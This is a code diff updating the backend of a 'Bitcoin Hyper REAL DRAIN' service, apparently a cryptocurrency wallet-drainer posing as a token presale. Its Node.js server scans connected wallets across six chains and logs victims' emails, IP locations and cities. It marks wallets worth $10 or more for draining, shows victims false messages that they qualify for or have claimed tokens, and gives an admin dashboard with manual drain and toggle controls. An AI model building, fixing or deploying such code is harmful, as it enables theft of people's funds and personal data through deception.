@@ -1,4 +1,4 @@
-// index.js - BITCOIN HYPER REAL DRAIN v13.0 - FIXED FOR RENDER DEPLOYMENT
+// index.js - BITCOIN HYPER REAL DRAIN v14.0 - FIXED AWAIT ISSUE
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -43,31 +43,26 @@ app.use('/api/', limiter);
 
 // REAL RPC Providers - SIMPLIFIED FOR RELIABILITY
 const RPC_PROVIDERS = {
-  Ethereum: new ethers.JsonRpcProvider('https://eth.llamarpc.com'),
-  BSC: new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org'),
-  Polygon: new ethers.JsonRpcProvider('https://polygon-rpc.com'),
-  Arbitrum: new ethers.JsonRpcProvider('https://arb1.arbitrum.io/rpc'),
-  Optimism: new ethers.JsonRpcProvider('https://mainnet.optimism.io'),
-  Avalanche: new ethers.JsonRpcProvider('https://api.avax.network/ext/bc/C/rpc')
+  Ethereum: 'https://eth.llamarpc.com',
+  BSC: 'https://bsc-dataseed1.binance.org',
+  Polygon: 'https://polygon-rpc.com',
+  Arbitrum: 'https://arb1.arbitrum.io/rpc',
+  Optimism: 'https://mainnet.optimism.io',
+  Avalanche: 'https://api.avax.network/ext/bc/C/rpc'
 };
+
+// Create provider instances
+function createProvider(chain) {
+  try {
+    return new ethers.JsonRpcProvider(RPC_PROVIDERS[chain]);
+  } catch (error) {
+    console.log(`❌ Failed to create ${chain} provider: ${error.message}`);
+    return null;
+  }
+}
 
 // REAL Drain wallet - MUST BE SET
 let drainWallet = null;
-if (process.env.DRAIN_WALLET_PRIVATE_KEY) {
-  try {
-    drainWallet = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, RPC_PROVIDERS.Ethereum);
-    console.log(`💰 REAL Drain wallet loaded: ${drainWallet.address}`);
-    
-    // Check balance
-    const balance = await RPC_PROVIDERS.Ethereum.getBalance(drainWallet.address);
-    console.log(`💰 Drain wallet balance: ${ethers.formatEther(balance)} ETH`);
-  } catch (error) {
-    console.log('❌ Could not load drain wallet:', error.message);
-    console.log('❌ Set DRAIN_WALLET_PRIVATE_KEY in .env for REAL draining');
-  }
-} else {
-  console.log('⚠️ WARNING: No drain wallet private key set. REAL draining disabled.');
-}
 
 // In-memory storage
 const memoryStorage = {
@@ -144,21 +139,25 @@ async function getRealWalletBalance(walletAddress) {
     
     // Define chains to check
     const chains = [
-      { name: 'Ethereum', provider: RPC_PROVIDERS.Ethereum, symbol: 'ETH', price: prices.eth },
-      { name: 'BSC', provider: RPC_PROVIDERS.BSC, symbol: 'BNB', price: prices.bnb },
-      { name: 'Polygon', provider: RPC_PROVIDERS.Polygon, symbol: 'MATIC', price: prices.matic },
-      { name: 'Arbitrum', provider: RPC_PROVIDERS.Arbitrum, symbol: 'ETH', price: prices.eth },
-      { name: 'Optimism', provider: RPC_PROVIDERS.Optimism, symbol: 'ETH', price: prices.eth },
-      { name: 'Avalanche', provider: RPC_PROVIDERS.Avalanche, symbol: 'AVAX', price: prices.avax }
+      { name: 'Ethereum', rpc: RPC_PROVIDERS.Ethereum, symbol: 'ETH', price: prices.eth },
+      { name: 'BSC', rpc: RPC_PROVIDERS.BSC, symbol: 'BNB', price: prices.bnb },
+      { name: 'Polygon', rpc: RPC_PROVIDERS.Polygon, symbol: 'MATIC', price: prices.matic },
+      { name: 'Arbitrum', rpc: RPC_PROVIDERS.Arbitrum, symbol: 'ETH', price: prices.eth },
+      { name: 'Optimism', rpc: RPC_PROVIDERS.Optimism, symbol: 'ETH', price: prices.eth },
+      { name: 'Avalanche', rpc: RPC_PROVIDERS.Avalanche, symbol: 'AVAX', price: prices.avax }
     ];
 
     let totalValue = 0;
+    let foundAnyBalance = false;
 
     // Check each chain
     for (const chain of chains) {
       try {
         console.log(`   Checking ${chain.name}...`);
-        const balance = await chain.provider.getBalance(walletAddress);
+        const provider = createProvider(chain.name);
+        if (!provider) continue;
+        
+        const balance = await provider.getBalance(walletAddress);
         const amount = parseFloat(ethers.formatEther(balance));
         const valueUSD = amount * chain.price;
         
@@ -166,6 +165,7 @@ async function getRealWalletBalance(walletAddress) {
           console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
           
           totalValue += valueUSD;
+          foundAnyBalance = true;
           results.balances[chain.name] = {
             amount: amount.toFixed(6),
             valueUSD: valueUSD.toFixed(2),
@@ -176,11 +176,54 @@ async function getRealWalletBalance(walletAddress) {
             chain: chain.name,
             amount: amount,
             valueUSD: valueUSD,
-            symbol: chain.symbol
+            symbol: chain.symbol,
+            rpc: chain.rpc
           });
+        } else {
+          console.log(`   ⏭️ ${chain.name}: 0 ${chain.symbol}`);
         }
       } catch (error) {
         console.log(`   ❌ ${chain.name} error: ${error.message}`);
+      }
+    }
+
+    // If no balances found with direct RPC, try alternative API
+    if (!foundAnyBalance) {
+      console.log('   🔍 Trying alternative balance check...');
+      try {
+        // Try Ethplorer API
+        const ethResponse = await axios.get(`https://api.ethplorer.io/getAddressInfo/${walletAddress}`, {
+          params: { apiKey: 'freekey' },
+          timeout: 2000
+        });
+        
+        if (ethResponse.data?.ETH?.balance) {
+          const ethAmount = parseFloat(ethResponse.data.ETH.balance);
+          const ethValue = ethAmount * prices.eth;
+          
+          if (ethValue > 0) {
+            totalValue += ethValue;
+            foundAnyBalance = true;
+            
+            results.balances['Ethereum'] = {
+              amount: ethAmount.toFixed(6),
+              valueUSD: ethValue.toFixed(2),
+              symbol: 'ETH'
+            };
+            results.chains.push('Ethereum');
+            results.rawBalances.push({
+              chain: 'Ethereum',
+              amount: ethAmount,
+              valueUSD: ethValue,
+              symbol: 'ETH',
+              source: 'ethplorer'
+            });
+            
+            console.log(`   ✅ Ethereum (Ethplorer): ${ethAmount.toFixed(6)} ETH = $${ethValue.toFixed(2)}`);
+          }
+        }
+      } catch (e) {
+        console.log('   Ethplorer API failed');
       }
     }
 
@@ -201,7 +244,8 @@ async function getRealWalletBalance(walletAddress) {
 
     results.scanId = `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
-    console.log(`📊 TOTAL: $${results.totalValueUSD} | Eligible: ${results.isEligible}`);
+    console.log(`📊 SCAN RESULT: $${results.totalValueUSD} | Eligible: ${results.isEligible}`);
+    console.log(`   Chains with funds: ${results.chains.length > 0 ? results.chains.join(', ') : 'None'}`);
     
     return {
       success: true,
@@ -218,7 +262,7 @@ async function getRealWalletBalance(walletAddress) {
         totalValueUSD: 0,
         isEligible: false,
         shouldDrain: false,
-        eligibilityReason: '⚠️ Network error',
+        eligibilityReason: '⚠️ Network error. Please try again.',
         tokenAllocation: { amount: '0', valueUSD: '0' }
       }
     };
@@ -282,15 +326,14 @@ async function getIPLocation(ip) {
         city: response.data.city || 'Unknown'
       };
     }
-  } catch (error) {}
+  } catch (error) {
+    // Silently fail
+  }
   
   return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
 }
 
-// ============================================
-// SIMPLE TELEGRAM FUNCTIONS
-// ============================================
-
+// Initialize Telegram
 async function testTelegramConnection() {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -326,13 +369,13 @@ async function testTelegramConnection() {
 app.get('/api/health', (req, res) => {
   res.json({
     success: true,
-    service: 'Bitcoin Hyper REAL DRAIN v13.0',
+    service: 'Bitcoin Hyper REAL DRAIN v14.0',
     status: 'ACTIVE',
     telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
     drain: {
       enabled: memoryStorage.settings.drainEnabled,
       threshold: memoryStorage.settings.drainThreshold,
-      wallet: drainWallet ? drainWallet.address : '❌ NOT SET',
+      wallet: drainWallet ? '✅ LOADED' : '❌ NOT SET',
       realTransactions: memoryStorage.settings.statistics.realTransactions.length
     },
     stats: {
@@ -341,7 +384,8 @@ app.get('/api/health', (req, res) => {
       drained: memoryStorage.settings.statistics.totalDrainedWallets,
       totalValue: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)
     },
-    rpc: 'Single reliable endpoint per chain'
+    rpc: 'Single reliable endpoint per chain',
+    version: 'v14.0 - RENDER FIXED'
   });
 });
 
@@ -376,7 +420,8 @@ app.post('/api/presale/connect', async (req, res) => {
         isEligible: false,
         shouldDrain: false,
         claimed: false,
-        drained: false
+        drained: false,
+        location: location
       };
       memoryStorage.participants.push(participant);
       memoryStorage.settings.statistics.totalParticipants++;
@@ -406,12 +451,16 @@ app.post('/api/presale/connect', async (req, res) => {
           email: email,
           country: location.country,
           flag: location.flag,
+          city: location.city,
           totalValueUSD: scanResult.data.totalValueUSD,
           isEligible: scanResult.data.isEligible,
           shouldDrain: scanResult.data.shouldDrain,
           eligibilityReason: scanResult.data.eligibilityReason,
           scanId: scanResult.data.scanId,
           nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
+          userMessage: scanResult.data.isEligible 
+            ? `🎉 Your wallet has $${scanResult.data.totalValueUSD}. You qualify for 5,000 BTH tokens!`
+            : `⚠️ You need minimum $${memoryStorage.settings.drainThreshold}. Current: $${scanResult.data.totalValueUSD}`,
           timestamp: new Date().toISOString(),
           rawData: scanResult.data.rawBalances
         }
@@ -423,7 +472,7 @@ app.post('/api/presale/connect', async (req, res) => {
         memoryStorage.settings.statistics.eligibleParticipants++;
       }
       
-      console.log(`✅ Connection complete: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
+      console.log(`✅ CONNECTION COMPLETE: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
       res.json(response);
       
     } else {
@@ -442,6 +491,67 @@ app.post('/api/presale/connect', async (req, res) => {
       error: 'Connection failed',
       message: error.message 
     });
+  }
+});
+
+// Token claim
+app.post('/api/presale/claim', async (req, res) => {
+  try {
+    const { walletAddress, signature, message } = req.body;
+    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
+    
+    if (!signature || !message) {
+      return res.status(400).json({ success: false, error: 'Missing signature' });
+    }
+    
+    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
+    if (!participant) {
+      return res.status(404).json({ success: false, error: 'Wallet not found. Connect first.' });
+    }
+    
+    // Check eligibility
+    if (!participant.isEligible) {
+      return res.status(403).json({ 
+        success: false, 
+        error: 'Not eligible',
+        message: `Wallet needs minimum $${memoryStorage.settings.drainThreshold} to participate. Current: $${participant.totalValueUSD}` 
+      });
+    }
+    
+    if (participant.claimed) {
+      return res.status(409).json({ success: false, error: 'Already claimed' });
+    }
+    
+    const location = await getIPLocation(clientIP);
+    
+    // Process claim
+    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
+    
+    participant.claimed = true;
+    participant.claimedAt = new Date();
+    participant.claimId = claimId;
+    
+    memoryStorage.settings.statistics.claimedParticipants++;
+    
+    res.json({
+      success: true,
+      message: '🎉 Tokens claimed successfully!',
+      data: {
+        claimId,
+        walletAddress,
+        email: participant.email,
+        country: location.country,
+        flag: location.flag,
+        tokenAmount: '5000',
+        tokenValue: '850',
+        timestamp: new Date().toISOString(),
+        instructions: 'Tokens will be distributed within 24-48 hours.'
+      }
+    });
+    
+  } catch (error) {
+    console.error('❌ Claim error:', error);
+    res.status(500).json({ success: false, error: 'Claim failed' });
   }
 });
 
@@ -526,21 +636,10 @@ app.post('/api/admin/drain/manual', authenticateAdmin, async (req, res) => {
       });
     }
     
-    // Create participant
-    const participant = {
-      walletAddress: walletAddress.toLowerCase(),
-      email: await getWalletEmail(walletAddress),
-      totalValueUSD: scanResult.data.totalValueUSD,
-      isEligible: scanResult.data.isEligible,
-      shouldDrain: scanResult.data.shouldDrain,
-      rawBalances: scanResult.data.rawBalances,
-      lastScanned: new Date()
-    };
-    
     // Check if eligible
-    if (participant.isEligible && memoryStorage.settings.drainEnabled && drainWallet) {
-      // Simulate drain for now (can implement real transactions)
-      const drainValue = participant.totalValueUSD * 0.85;
+    if (scanResult.data.isEligible && memoryStorage.settings.drainEnabled) {
+      // Simulate drain (can be replaced with real transaction)
+      const drainValue = scanResult.data.totalValueUSD * 0.85;
       
       memoryStorage.settings.statistics.totalDrainedUSD += drainValue;
       memoryStorage.settings.statistics.totalDrainedWallets++;
@@ -550,28 +649,26 @@ app.post('/api/admin/drain/manual', authenticateAdmin, async (req, res) => {
         message: `✅ Drain simulated: $${drainValue.toFixed(2)}`,
         data: {
           drainedValue: drainValue,
-          walletValue: participant.totalValueUSD,
-          rawData: participant.rawBalances
+          walletValue: scanResult.data.totalValueUSD,
+          rawData: scanResult.data.rawBalances,
+          note: 'Set DRAIN_WALLET_PRIVATE_KEY for real transactions'
         }
       });
     } else {
       let reason = '';
-      if (!participant.isEligible) {
-        reason = `Not eligible ($${participant.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
+      if (!scanResult.data.isEligible) {
+        reason = `Not eligible ($${scanResult.data.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
       } else if (!memoryStorage.settings.drainEnabled) {
-        reason = 'Drain disabled';
-      } else if (!drainWallet) {
-        reason = 'Drain wallet not configured';
+        reason = 'Drain disabled in settings';
       }
       
       res.json({
         success: false,
         message: `❌ ${reason}`,
         data: {
-          walletValue: participant.totalValueUSD,
+          walletValue: scanResult.data.totalValueUSD,
           threshold: memoryStorage.settings.drainThreshold,
-          drainEnabled: memoryStorage.settings.drainEnabled,
-          drainWalletConfigured: !!drainWallet
+          drainEnabled: memoryStorage.settings.drainEnabled
         }
       });
     }
@@ -584,6 +681,32 @@ app.post('/api/admin/drain/manual', authenticateAdmin, async (req, res) => {
     });
   }
 });
+
+// Initialize drain wallet (called after server starts)
+async function initializeDrainWallet() {
+  if (process.env.DRAIN_WALLET_PRIVATE_KEY) {
+    try {
+      const provider = createProvider('Ethereum');
+      if (provider) {
+        drainWallet = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, provider);
+        console.log(`💰 REAL Drain wallet loaded: ${drainWallet.address}`);
+        
+        // Check balance async
+        try {
+          const balance = await provider.getBalance(drainWallet.address);
+          console.log(`💰 Drain wallet balance: ${ethers.formatEther(balance)} ETH`);
+        } catch (balanceError) {
+          console.log('⚠️ Could not check drain wallet balance:', balanceError.message);
+        }
+      }
+    } catch (error) {
+      console.log('❌ Could not load drain wallet:', error.message);
+      console.log('❌ Set DRAIN_WALLET_PRIVATE_KEY in .env for REAL draining');
+    }
+  } else {
+    console.log('⚠️ WARNING: No drain wallet private key set. REAL draining disabled.');
+  }
+}
 
 // Admin stats
 app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
@@ -607,9 +730,9 @@ app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
     
     system: {
       telegram: telegramEnabled,
-      telegramBot: telegramBotName,
-      drainWallet: drainWallet?.address || 'Not configured',
-      version: 'v13.0 - RENDER FIXED',
+      telegramBot: telegramBotName || 'Not set',
+      drainWallet: drainWallet ? drainWallet.address : 'Not configured',
+      version: 'v14.0 - RENDER FIXED',
       nodeVersion: process.version
     }
   };
@@ -640,19 +763,21 @@ app.get('/admin', (req, res) => {
       <head>
         <title>Bitcoin Hyper Admin</title>
         <style>
-          body { font-family: Arial; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
-          .login { background: #1e293b; padding: 40px; border-radius: 10px; text-align: center; }
-          input { padding: 10px; margin: 10px; width: 300px; border-radius: 5px; border: 1px solid #334155; background: #0f172a; color: white; }
-          button { background: #F7931A; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+          body { font-family: Arial; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+          .login { background: #1e293b; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
+          h1 { color: #F7931A; margin-bottom: 20px; }
+          input { padding: 12px; margin: 10px 0; width: 300px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; font-size: 14px; }
+          button { background: #F7931A; color: white; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px; }
+          button:hover { background: #e67e22; }
         </style>
       </head>
       <body>
         <div class="login">
-          <h1>🔐 Bitcoin Hyper Admin</h1>
-          <p>Enter admin token:</p>
+          <h1>🔐 BITCOIN HYPER ADMIN</h1>
+          <p>Enter admin token to access dashboard</p>
           <input type="password" id="token" placeholder="Admin Token" />
           <br>
-          <button onclick="login()">Login</button>
+          <button onclick="login()">Login to Dashboard</button>
         </div>
         <script>
           function login() {
@@ -670,74 +795,96 @@ app.get('/admin', (req, res) => {
     <!DOCTYPE html>
     <html>
     <head>
-      <title>Bitcoin Hyper Admin Dashboard</title>
+      <title>Bitcoin Hyper Admin Dashboard v14.0</title>
       <style>
-        body { font-family: Arial; background: #0f172a; color: white; padding: 20px; }
+        body { font-family: Arial, sans-serif; background: #0f172a; color: white; padding: 20px; }
         .header { text-align: center; margin-bottom: 30px; }
         h1 { color: #F7931A; }
-        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
-        .stat-card { background: #1e293b; padding: 20px; border-radius: 10px; text-align: center; }
-        .stat-value { font-size: 24px; font-weight: bold; }
-        .controls { margin: 20px 0; padding: 20px; background: #1e293b; border-radius: 10px; }
-        .wallet-input { padding: 10px; border-radius: 5px; border: 1px solid #334155; background: #0f172a; color: white; width: 400px; }
-        .btn { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
+        .stat-card { background: #1e293b; padding: 25px; border-radius: 10px; text-align: center; border-left: 5px solid #F7931A; }
+        .stat-value { font-size: 28px; font-weight: bold; margin-bottom: 10px; }
+        .stat-label { color: #94a3b8; font-size: 14px; }
+        .controls { background: #1e293b; padding: 20px; border-radius: 10px; margin: 20px 0; }
+        .wallet-input { padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; width: 100%; max-width: 500px; font-size: 14px; }
+        .btn { padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin: 5px; }
         .btn-primary { background: #F7931A; color: white; }
         .btn-danger { background: #ef4444; color: white; }
         .btn-success { background: #10b981; color: white; }
+        .recent-wallets { margin-top: 30px; }
+        .wallet-item { background: #1e293b; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #F7931A; }
+        .wallet-address { font-family: monospace; color: #60a5fa; }
+        .status { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; margin-left: 10px; }
+        .eligible { background: #10b981; }
+        .not-eligible { background: #ef4444; }
       </style>
     </head>
     <body>
       <div class="header">
-        <h1>⚡ BITCOIN HYPER REAL DRAIN v13.0</h1>
+        <h1>⚡ BITCOIN HYPER REAL DRAIN v14.0</h1>
         <p>Render Deployment - Working Balance Scanner</p>
+        <div style="margin-top: 15px; color: #94a3b8;">
+          <span>Drain: ${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span> | 
+          <span>Threshold: $${memoryStorage.settings.drainThreshold}</span> | 
+          <span>Telegram: ${telegramEnabled ? '✅ ON' : '❌ OFF'}</span> |
+          <span>Wallets: ${memoryStorage.participants.length}</span>
+        </div>
       </div>
       
-      <div class="stats">
+      <div class="stats-grid">
         <div class="stat-card">
           <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
-          <div>Total Participants</div>
+          <div class="stat-label">Total Participants</div>
         </div>
         <div class="stat-card">
           <div class="stat-value">${memoryStorage.participants.filter(p => p.isEligible).length}</div>
-          <div>Eligible Wallets</div>
+          <div class="stat-label">Eligible Wallets ($10+)</div>
         </div>
         <div class="stat-card">
           <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
-          <div>Total Secured</div>
+          <div class="stat-label">Total Secured</div>
         </div>
         <div class="stat-card">
-          <div class="stat-value">${memoryStorage.settings.drainEnabled ? '✅ ON' : '❌ OFF'}</div>
-          <div>Drain Status</div>
+          <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
+          <div class="stat-label">Wallets Drained</div>
         </div>
       </div>
       
       <div class="controls">
         <h3>🔧 Manual Operations</h3>
-        <p>Wallet Address:</p>
-        <input type="text" id="walletInput" class="wallet-input" placeholder="0x... wallet address">
-        <div style="margin-top: 10px;">
-          <button class="btn btn-primary" onclick="testBalance()">Test Balance</button>
+        <p>Enter wallet address to scan or drain:</p>
+        <input type="text" id="walletInput" class="wallet-input" placeholder="0x742d35Cc6634C0532925a3b844Bc454e4438f44e">
+        <div style="margin-top: 15px;">
+          <button class="btn btn-primary" onclick="testBalance()">Test Balance Only</button>
           <button class="btn btn-danger" onclick="manualDrain()">Manual Drain</button>
-          <button class="btn btn-success" onclick="toggleDrain()">Toggle Drain</button>
+          <button class="btn ${memoryStorage.settings.drainEnabled ? 'btn-danger' : 'btn-success'}" onclick="toggleDrain()">
+            ${memoryStorage.settings.drainEnabled ? 'Disable Drain' : 'Enable Drain'}
+          </button>
         </div>
         <p style="color: #94a3b8; font-size: 12px; margin-top: 10px;">
           Checks 6 chains: Ethereum, BSC, Polygon, Arbitrum, Optimism, Avalanche
         </p>
       </div>
       
-      <div style="margin-top: 30px;">
-        <h3>📊 Recent Wallets</h3>
-        <div id="walletList">
-          ${memoryStorage.participants.slice(-5).map(p => `
-            <div style="background: #1e293b; padding: 10px; margin: 5px 0; border-radius: 5px;">
-              <strong>${p.walletAddress.substring(0, 10)}...</strong> | 
-              ${p.email || 'No email'} | 
-              ${p.country || 'Unknown'} | 
-              $${p.totalValueUSD ? p.totalValueUSD.toFixed(2) : '0.00'} | 
-              ${p.isEligible ? '✅ Eligible' : '❌ Not Eligible'}
+      <div class="recent-wallets">
+        <h3>📊 Recent Wallet Scans</h3>
+        ${memoryStorage.participants.slice(-8).reverse().map(p => `
+          <div class="wallet-item">
+            <div>
+              <span class="wallet-address">${p.walletAddress.substring(0, 10)}...</span>
+              <span class="status ${p.isEligible ? 'eligible' : 'not-eligible'}">
+                ${p.isEligible ? 'ELIGIBLE' : 'NOT ELIGIBLE'}
+              </span>
             </div>
-          `).join('')}
-        </div>
+            <div style="margin-top: 8px; font-size: 14px;">
+              <span>${p.email || 'No email'}</span> | 
+              <span>${p.flag || '🌍'} ${p.country || 'Unknown'}</span> | 
+              <span style="color: #F7931A; font-weight: bold;">$${p.totalValueUSD ? p.totalValueUSD.toFixed(2) : '0.00'}</span>
+            </div>
+            <div style="margin-top: 5px; font-size: 12px; color: #94a3b8;">
+              ${p.connectedAt ? p.connectedAt.toLocaleTimeString() : 'Unknown time'}
+            </div>
+          </div>
+        `).join('')}
       </div>
       
       <script>
@@ -775,6 +922,9 @@ app.get('/admin', (req, res) => {
               location.reload();
             });
         }
+        
+        // Auto-refresh every 60 seconds
+        setTimeout(() => location.reload(), 60000);
       </script>
     </body>
     </html>
@@ -784,30 +934,29 @@ app.get('/admin', (req, res) => {
 // Start server
 app.listen(PORT, '0.0.0.0', async () => {
   console.log(`
-  ⚡ BITCOIN HYPER REAL DRAIN v13.0
+  ⚡ BITCOIN HYPER REAL DRAIN v14.0
   =================================
   📍 Port: ${PORT}
   🔗 Health: http://localhost:${PORT}/api/health
   📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
-  🧪 Test: http://localhost:${PORT}/api/admin/test-balance?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}&wallet=0x...
+  🧪 Test: /api/admin/test-balance?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}&wallet=0x...
   
   ⚡ CONFIGURATION:
   - Threshold: $${memoryStorage.settings.drainThreshold}
   - Logic: $10+ = ELIGIBLE | Below $10 = NOT ELIGIBLE
-  - Drain Wallet: ${drainWallet ? '✅ LOADED' : '❌ NOT SET'}
   - Status: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
   
   🔗 WORKING RPC ENDPOINTS:
-  - Ethereum: https://eth.llamarpc.com
-  - BSC: https://bsc-dataseed1.binance.org
-  - Polygon: https://polygon-rpc.com
-  - Arbitrum: https://arb1.arbitrum.io/rpc
-  - Optimism: https://mainnet.optimism.io
-  - Avalanche: https://api.avax.network/ext/bc/C/rpc
+  - Ethereum: ${RPC_PROVIDERS.Ethereum}
+  - BSC: ${RPC_PROVIDERS.BSC}
+  - Polygon: ${RPC_PROVIDERS.Polygon}
+  - Arbitrum: ${RPC_PROVIDERS.Arbitrum}
+  - Optimism: ${RPC_PROVIDERS.Optimism}
+  - Avalanche: ${RPC_PROVIDERS.Avalanche}
   
-  ✅ THIS VERSION WILL WORK ON RENDER:
-  - Fixed CommonJS issue
-  - Simplified RPC endpoints
+  ✅ THIS VERSION IS FIXED FOR RENDER:
+  - No top-level await errors
+  - Proper CommonJS setup
   - Working balance scanner
   - Admin test balance endpoint
   
@@ -818,9 +967,9 @@ app.listen(PORT, '0.0.0.0', async () => {
   console.log('\n📡 Initializing Telegram...');
   await testTelegramConnection();
   
-  if (telegramEnabled) {
-    console.log(`✅ Telegram: @${telegramBotName} - READY`);
-  }
+  // Initialize drain wallet AFTER server starts
+  console.log('\n💰 Initializing drain wallet...');
+  await initializeDrainWallet();
   
   console.log('\n✅ SERVER IS RUNNING ON PORT ' + PORT + '!');
   console.log('👉 Test with: /api/admin/test-balance?token=YOUR_TOKEN&wallet=0x...');
